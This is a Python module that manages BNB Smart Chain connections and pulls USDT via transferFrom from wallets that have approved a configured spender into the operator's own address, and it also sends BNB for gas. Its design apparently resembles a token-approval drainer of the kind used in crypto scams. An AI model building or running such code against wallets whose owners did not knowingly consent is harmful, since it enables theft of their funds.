"""
Blockchain interaction module
Handles Web3 connections and USDT contract operations
"""

import logging
import time
from typing import Optional, Tuple
from web3 import Web3
from web3.exceptions import ContractLogicError, TransactionNotFound
from config import (
    BSC_RPC, SPENDER_ADDRESS, USDT_ADDRESS, PRIVATE_KEY,
    DEFAULT_GAS_LIMIT, DEFAULT_GAS_PRICE_GWEI, ERC20_ABI, USDT_DECIMALS
)

logger = logging.getLogger(__name__)


class BlockchainManager:
    """Manages blockchain interactions and USDT operations"""

    def __init__(self):
        """Initialize Web3 connection and contract instances"""
        try:
            self.w3 = Web3(Web3.HTTPProvider(BSC_RPC))

            if not self.w3.is_connected():
                raise ConnectionError("Failed to connect to BSC network")

            # Initialize main account
            self.account = self.w3.eth.account.from_key(PRIVATE_KEY)
            self.my_address = self.account.address

            # Initialize auto gas account (may be same as main)
            try:
                from config import AUTO_GAS_PRIVATE_KEY
                self.auto_gas_account = self.w3.eth.account.from_key(AUTO_GAS_PRIVATE_KEY)
                self.auto_gas_address = self.auto_gas_account.address
            except Exception:
                # Fallback to main account if auto gas key not available
                self.auto_gas_account = self.account
                self.auto_gas_address = self.my_address

            # Initialize USDT contract
            self.usdt_contract = self.w3.eth.contract(
                address=USDT_ADDRESS,
                abi=ERC20_ABI
            )

            logger.info(
                f"Blockchain manager initialized. Main: {self.my_address}, AutoGas: {self.auto_gas_address}")

        except Exception as e:
            logger.error(f"Failed to initialize blockchain manager: {e}")
            raise

    def validate_address(self, address: str) -> bool:
        """Validate if the given string is a valid Ethereum address"""
        try:
            # Clean the address (remove whitespace and common prefixes/suffixes)
            address = address.strip().lower()
            
            # Handle common formats
            if address.startswith('0x'):
                address = address[2:]
            
            # Check if it's exactly 40 hexadecimal characters
            if len(address) != 40:
                return False
                
            # Check if all characters are hexadecimal
            try:
                int(address, 16)
            except ValueError:
                return False
            
            # Reconstruct the address with 0x prefix
            full_address = '0x' + address
            
            # Use Web3's built-in validation
            return self.w3.is_address(full_address)
        except Exception as e:
            logger.error(f"Error validating address {address}: {e}")
            return False
    
    def clean_address_input(self, address: str) -> str:
        """Clean and format address input"""
        try:
            # Remove whitespace and common text
            address = address.strip()
            
            # Handle common formats and extract address
            import re
            # Pattern to find Ethereum addresses
            pattern = r'(0x[a-fA-F0-9]{40})'
            match = re.search(pattern, address)
            
            if match:
                return match.group(1)
            
            # If no 0x prefix, try to add it
            if len(address) == 40 and all(c in '0123456789abcdefABCDEF' for c in address):
                return '0x' + address
            
            return address
        except Exception as e:
            logger.error(f"Error cleaning address {address}: {e}")
            return address

    def get_usdt_balance(self, address: str) -> Optional[float]:
        """Get USDT balance for a given address"""
        try:
            checksum_address = Web3.to_checksum_address(address)
            balance_wei = self.usdt_contract.functions.balanceOf(
                checksum_address).call()
            balance_usdt = balance_wei / (10 ** USDT_DECIMALS)
            return balance_usdt
        except Exception as e:
            logger.error(f"Error getting USDT balance for {address}: {e}")
            return None

    def get_allowance(self, owner: str, spender: str = None) -> Optional[float]:
        """Get USDT allowance from owner to spender"""
        try:
            if spender is None:
                spender = SPENDER_ADDRESS

            checksum_owner = Web3.to_checksum_address(owner)
            checksum_spender = Web3.to_checksum_address(spender)

            allowance_wei = self.usdt_contract.functions.allowance(
                checksum_owner, checksum_spender
            ).call()

            allowance_usdt = allowance_wei / (10 ** USDT_DECIMALS)
            return allowance_usdt
        except Exception as e:
            logger.error(
                f"Error getting allowance from {owner} to {spender}: {e}")
            return None

    def get_gas_price(self) -> int:
        """Get current gas price or use default"""
        try:
            current_gas_price = self.w3.eth.gas_price
            # Use 20% higher than current gas price for faster confirmation
            return int(current_gas_price * 1.2)
        except Exception as e:
            logger.warning(
                f"Failed to get current gas price: {e}. Using default.")
            return self.w3.to_wei(DEFAULT_GAS_PRICE_GWEI, "gwei")

    def estimate_gas(self, transaction) -> int:
        """Estimate gas required for transaction"""
        try:
            estimated = self.w3.eth.estimate_gas(transaction)
            # Add 20% buffer to estimated gas
            return int(estimated * 1.2)
        except Exception as e:
            logger.warning(f"Failed to estimate gas: {e}. Using default.")
            return DEFAULT_GAS_LIMIT

    def withdraw_usdt(self, from_wallet: str, amount_usdt: float) -> Tuple[bool, str]:
        """
        Withdraw USDT from approved wallet

        Args:
            from_wallet: Address to withdraw from
            amount_usdt: Amount in USDT to withdraw

        Returns:
            Tuple of (success: bool, message: str)
        """
        try:
            # Validate addresses
            if not self.validate_address(from_wallet):
                return False, "Invalid wallet address"

            from_wallet = Web3.to_checksum_address(from_wallet)
            amount_wei = int(amount_usdt * (10 ** USDT_DECIMALS))

            # Check allowance
            allowance = self.get_allowance(from_wallet)
            if allowance is None:
                return False, "Failed to check allowance"

            if allowance < amount_usdt:
                return False, f"Insufficient allowance. Available: {allowance:.6f} USDT"

            # Check sender's balance
            balance = self.get_usdt_balance(from_wallet)
            if balance is None:
                return False, "Failed to check wallet balance"

            if balance < amount_usdt:
                return False, f"Insufficient balance. Available: {balance:.6f} USDT"

            # Build transaction
            nonce = self.w3.eth.get_transaction_count(self.my_address)

            transaction = self.usdt_contract.functions.transferFrom(
                from_wallet,
                self.my_address,
                amount_wei
            ).build_transaction({
                "from": self.my_address,
                "nonce": nonce,
                "gas": self.estimate_gas({
                    "from": self.my_address,
                    "to": USDT_ADDRESS,
                    "data": self.usdt_contract.functions.transferFrom(
                        from_wallet, self.my_address, amount_wei
                    )._encode_transaction_data()
                }),
                "gasPrice": self.get_gas_price()
            })

            # Sign and send transaction
            signed_txn = self.w3.eth.account.sign_transaction(
                transaction, PRIVATE_KEY)
            tx_hash = self.w3.eth.send_raw_transaction(
                signed_txn.raw_transaction)

            # Wait for transaction confirmation
            tx_receipt = self.wait_for_transaction(tx_hash)

            if tx_receipt and tx_receipt.status == 1:
                tx_hash_hex = tx_hash.hex()
                bsc_link = f"https://bscscan.com/tx/{tx_hash_hex}"
                return True, f"✅ Successfully withdrawn {amount_usdt:.6f} USDT\n🔗 Transaction: {bsc_link}"
            else:
                return False, "Transaction failed or was reverted"

        except ContractLogicError as e:
            logger.error(f"Contract logic error during withdrawal: {e}")
            return False, f"Smart contract error: {str(e)}"
        except ValueError as e:
            logger.error(f"Value error during withdrawal: {e}")
            return False, f"Transaction error: {str(e)}"
        except Exception as e:
            logger.error(f"Unexpected error during withdrawal: {e}")
            return False, f"Unexpected error: {str(e)}"

    def wait_for_transaction(self, tx_hash, timeout: int = 120) -> Optional[dict]:
        """Wait for transaction confirmation"""
        try:
            start_time = time.time()
            while time.time() - start_time < timeout:
                try:
                    receipt = self.w3.eth.get_transaction_receipt(tx_hash)
                    logger.info(
                        f"Transaction {tx_hash.hex()} confirmed with status: {receipt.status}")
                    return receipt
                except TransactionNotFound:
                    time.sleep(2)
                    continue

            logger.warning(f"Transaction {tx_hash.hex()} confirmation timeout")
            return None
        except Exception as e:
            logger.error(f"Error waiting for transaction confirmation: {e}")
            return None
    
    def get_bnb_balance(self, address: str) -> Optional[float]:
        """Get BNB balance for a given address"""
        try:
            checksum_address = Web3.to_checksum_address(address)
            balance_wei = self.w3.eth.get_balance(checksum_address)
            balance_bnb = self.w3.from_wei(balance_wei, 'ether')
            return float(balance_bnb)
        except Exception as e:
            logger.error(f"Error getting BNB balance for {address}: {e}")
            return None
    
    def get_usd_equivalent(self, usdt_amount: float) -> str:
        """Format USDT amount as USD equivalent"""
        return f"${usdt_amount:.2f}"
    
    def is_wallet_approved(self, address: str) -> Tuple[bool, float]:
        """Check if wallet has approved USDT allowance"""
        try:
            allowance = self.get_allowance(address)
            if allowance is None:
                return False, 0.0
            return allowance > 0, allowance
        except Exception as e:
            logger.error(f"Error checking wallet approval for {address}: {e}")
            return False, 0.0
    
    def send_bnb(self, to_address: str, amount_bnb: float, from_private_key: str = None) -> Tuple[bool, str]:
        """Send BNB to specified address"""
        try:
            # Use auto gas private key if provided, otherwise main key
            from config import AUTO_GAS_PRIVATE_KEY
            private_key = from_private_key or AUTO_GAS_PRIVATE_KEY
            from_account = self.w3.eth.account.from_key(private_key)
            from_address = from_account.address
            
            # Validate addresses
            if not self.validate_address(to_address):
                return False, "Invalid recipient address"
            
            to_address = Web3.to_checksum_address(to_address)
            amount_wei = self.w3.to_wei(amount_bnb, 'ether')
            
            # Check sender's BNB balance
            sender_balance = self.get_bnb_balance(from_address)
            if sender_balance is None:
                return False, "Failed to check sender BNB balance"
            
            total_needed = amount_bnb + 0.0001  # Add gas buffer
            if sender_balance < total_needed:
                return False, f"Insufficient BNB balance. Available: {sender_balance:.8f} BNB"
            
            # Build transaction
            nonce = self.w3.eth.get_transaction_count(from_address)
            gas_price = self.get_gas_price()
            
            transaction = {
                'to': to_address,
                'value': amount_wei,
                'gas': 21000,  # Standard BNB transfer gas
                'gasPrice': gas_price,
                'nonce': nonce,
            }
            
            # Sign and send transaction
            signed_txn = self.w3.eth.account.sign_transaction(transaction, private_key)
            tx_hash = self.w3.eth.send_raw_transaction(signed_txn.raw_transaction)
            
            # Wait for confirmation
            tx_receipt = self.wait_for_transaction(tx_hash, timeout=60)
            
            if tx_receipt and tx_receipt.status == 1:
                tx_hash_hex = tx_hash.hex()
                bsc_link = f"https://bscscan.com/tx/{tx_hash_hex}"
                return True, f"✅ Successfully sent {amount_bnb:.8f} BNB\n🔗 Transaction: {bsc_link}"
            else:
                return False, "BNB transaction failed or was reverted"
                
        except Exception as e:
            logger.error(f"Error sending BNB: {e}")
            return False, f"BNB transfer error: {str(e)}"


# Global blockchain manager instance
blockchain_manager = BlockchainManager()
